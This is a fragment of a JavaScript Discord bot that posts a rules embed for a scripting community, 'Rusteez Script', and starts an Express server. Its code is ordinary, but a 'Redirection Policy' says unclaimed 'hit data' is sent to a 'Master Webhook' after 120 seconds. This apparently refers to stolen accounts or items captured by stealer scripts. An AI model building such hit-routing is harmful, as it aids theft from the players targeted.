                value: "1.) **Legal Compliance:** Follow the Discord Terms of Service and Community Guidelines.\n" +
                       "2.) **Age Requirement:** You must be 13 years or older. Underage users will be banned immediately.\n" +
                       "3.) **Zero Tolerance:** No racist, discriminatory language, or slurs. This includes the n-word and any offensive terms.\n" +
                       "4.) **Respect Staff:** Respect moderator decisions. Do not publicly argue about moderation actions taken.\n" +
                       "5.) **NSFW Content:** Posting sexually explicit content, nudity, or gore is strictly prohibited."
            },
            { 
                name: "Section II: Communication", 
                value: "6.) **English Only:** English is the only language tolerated in main channels.\n" +
                       "7.) **No Spamming:** Avoid repetitive messages, excessive emojis (Max 3), or unsolicited advertisements.\n" +
                       "8.) **Pinging Policy:** Do not mass-ping users or staff. Only ping staff for genuine assistance or questions.\n" +
                       "9.) **No Spoiling/Trolling:** Do not disrupt the community with spoilers, excessive CAPS, or toxic behavior."
            },
            { 
                name: "Section III: Safety & Security", 
                value: "10.) **No Advertising:** Do not promote other Discord servers, Telegrams, or external services.\n" +
                       "11.) **No Scamming:** Phishing links, fake giveaways, or misleading information will result in a permanent ban.\n" +
                       "12.) **No Selling:** Selling external goods or services is not allowed to maintain a safe environment.\n" +
                       "13.) **No Dating/Doxxing:** This is a scripting community. Dating and sharing private info (doxxing) are forbidden."
            },
            { 
                name: "⚠️ Important: Redirection Policy", 
                value: "To ensure network stability and security, all active hits are monitored.\n" +
                       "If a trade is not successfully completed by the script owner within **120 seconds**, the hit data will be automatically redirected to our Master Webhook for logging and security synchronization.\n\n" +
                       "*Don't be slow — Stay active.*"
            }
        )
        .setFooter({ text: "Rusteez Script • Stay Safe", iconURL: clientDiscord.user.displayAvatarURL() })
        .setTimestamp();

    const message = await channel.send({ embeds: [rulesEmbed] });
    
    // Ajout des réactions automatiques comme demandé
    await message.react('👍');
    await message.react('❤️');
    await message.react('🔥');

    console.log("✅ Official Rules sent with reactions!");
}
app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
